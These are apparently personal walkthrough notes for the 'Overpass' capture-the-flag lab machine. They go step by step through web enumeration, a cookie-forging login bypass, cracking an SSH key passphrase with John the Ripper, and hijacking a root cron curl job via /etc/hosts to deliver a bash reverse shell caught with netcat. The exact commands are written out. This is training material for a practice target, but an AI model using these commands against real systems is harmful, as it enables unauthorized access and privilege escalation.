Of course, start with an NMAP
	We see port 22 and port 80 open
	we find a website on port 80
Lets use gobuster
	with both big.txt and medium.txt we find an admin page
	medium.txt showed us more pages faster
	admin only shows us so much, however downloads shows us the source code
	we also see the build code, more on that later
	lets go back to admin, and we can see that the login is .js so it is using a javascript code
	click on debugger
looking at login.js
	we can see that cookies are no actually set, the status or Cookies area is assigned as the cookie value, but the cookie is not validated
	this should mean we can change the cookies to anything but incorrect value and create a session
	put in the following command
		Cookies.set("SessionToken", 'myCookieValue')
		Now refresh the page
We have some SSH keys
	Copy and save those ssh keys in a nano file, james_rsa
	Now put the nano file into something john the ripper can understand
		python /usr/share/john/ssh2john.py james_rsa > crack
	Now use john to crack the wordlist
		john --wordlist=/usr/share/wordlists/rockyou.txt crack
	Now ssh in with sudo
		sudo ssh -i james_rsa james@10.10.4.215
We are in
	ls -la
	cat user.txt
	cat todo.txt
		we see update overpass encryption
	cat .overpass (to try and see encryption)
		we see it is ROT47 due to the characters included, such as the , > ? = :
		decode this and we get the following
			[{"name":"System","pass":"saydrawnlyingpicture"}]t	
		That is no the password, however the script talks about an automate build script
		Within Linux buildscripts happen in the crontab
		We can see that end the end we have a root curl overpass script (no questions asked)
		Lets trick curl to download a script that we make called buildscript.sh
		nano /etc/hosts
			go to thm
			change IP address to your kali linux tunnel IP
		There are hundreds of different scripts you can create, just need to give yourself root access
			bash -i >& /dev/tcp/10.9.124.138/4444 0>&1 
			MAKE SURE YOU PUT IN YOUR OWN IP ABOVE
On Kali machine make a new directory at home
mkdir /www/downloads/src
		sudo nano buildscript.sh
	save the above script as buildscript.sh
	from here utilize net cat to listen
		nc -lvnp 4444
	now turn on a simple http server
		sudo python -m SimpleHTTPServer 80
Wait one minute and your script will be downloaded, thus allowing you to be root
	ls -la
	cat root.txt
